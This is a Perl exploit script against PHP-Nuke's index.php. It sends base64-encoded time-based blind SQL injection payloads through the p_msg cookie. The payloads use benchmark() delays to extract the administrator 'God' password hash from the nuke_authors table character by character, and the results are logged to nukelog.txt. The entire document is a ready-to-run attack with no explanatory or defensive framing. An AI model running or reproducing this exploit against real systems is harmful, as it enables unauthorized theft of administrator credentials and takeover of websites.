
use MIME::Base64;
use IO::Socket;

#------------------------------------------------
$logfile = "nukelog.txt";
@chars = ("0","1","2","3","4","5","6","7","8","9","a","b","c","d","e","f");
$data = "";
#------------------------------------------------
$remote = '127.0.0.1';
$port = 80;
$url = "/index.php";

# NB!! Tweak $md5times variable, to adjust the delay
# according to server`s perfomance and latency.

$md5times = 260000;

#------------------------------------------------
###################################
# #
# Calibration begins ... #
# #
###################################

$logline = "----- Page generation time meanvalue will be calculated now ----- " ;

print $logline . "\n";
Writelogline($logline);

$sum = 0;

for($cnt=0;$cnt<10;$cnt++)
{
    $charx = @chars[$cnt];
    $admin = "whateveraid:3974c84293fadcc0f0db9227fdd4cba3:";
    
    $admin = encode_base64($admin);
    $admin =~ s/\=/%3d/g;
    $admin =~ s/\n//g;

    $cookie = "lang=english; ";
    $cookie .= "admin=";
    $cookie .= $admin;

    $data = MakeGetRequest($remote, $url ,$cookie);
    $mytime = GetGenTime($data);
    
    $xtime = $mytime;
    $OK_CHARS='0-9';
    $xtime =~ s/[^$OK_CHARS]//go;
    $inttime = int($xtime);
    $sum += $inttime;
    
}

$meantime = int ($sum / 10);

$logline = "Mean page generation time --> " . $meantime . "ms " ;
print $logline . "\n";
Writelogline($logline);


#------------------------------------------------

$md5hash = "";

for($nr=1;$nr<33;$nr++)
{
    for($cnt=0;$cnt<16;$cnt++)
    {
        $charx = @chars[$cnt];

        $admin = "x' union select null,null,null,pwd from nuke_authors where name='God' AND IF(mid(pwd,". $nr .",1)='" . $charx ."',benchmark($md5times,md5('r00t')),1)/*";
    
        $admin = encode_base64($admin);
        $admin =~ s/\=/%3d/g;
        $admin =~ s/\n//g;

        $cookie = "p_msg=$admin; ";

        $data = MakeGetRequest($remote, $url ,$cookie);
        $mytime = GetGenTime($data);
    
        $xtime = $mytime;
        $OK_CHARS='0-9';
        $xtime =~ s/[^$OK_CHARS]//go;
        $inttime = int($xtime);

        $logline = "pos --> " . $nr . "char --> " . $charx . " --> " . $inttime;
        print $logline . "\n";
        Writelogline($logline);
        
        if(int(($inttime/$meantime))>5)
        {
            $md5hash .= @chars[$cnt];
            $logline = "current md5hash --> " . $md5hash;
            print $logline . "\n";
            Writelogline($logline);
            $cnt = 17;
            break;
        }

    }
}

$logline = "----- Final md5hash --> " . $md5hash . "-----";
print $logline . "\n";
Writelogline($logline);


exit();




sub MakeGetRequest()
{
    $socket = IO::Socket::INET->new(PeerAddr => $remote,
                PeerPort => $port,
                Proto => "tcp",
                Type => SOCK_STREAM)
	or die "Couldnt connect to $remote:$port : $@\n";
    $str = "GET " . $url . " HTTP/1.0\r\n";
    print $socket $str;
    print $socket "Cookie: $cookie\r\n";
    print $socket "Host: $remote\r\n\r\n";

    $buff = "";
    while ($answer = <$socket>)
    {
	$buff .= $answer;
    }
    close($socket);
    return $buff;
}

sub GetGenTime($data)
{
    $idx1 = index($data,"Page Generation: ");
    $buff1 = substr($data,$idx1+16,10);
    return $buff1;
}

######################################################
sub Writelogline($)
{
    $logline=$_[0];
    $writeline = $logline . "\n";
    open (LOG, ">>$logfile") || die "Can't open $logfile\n";
    print LOG $writeline;
    close LOG;
}
######################################################




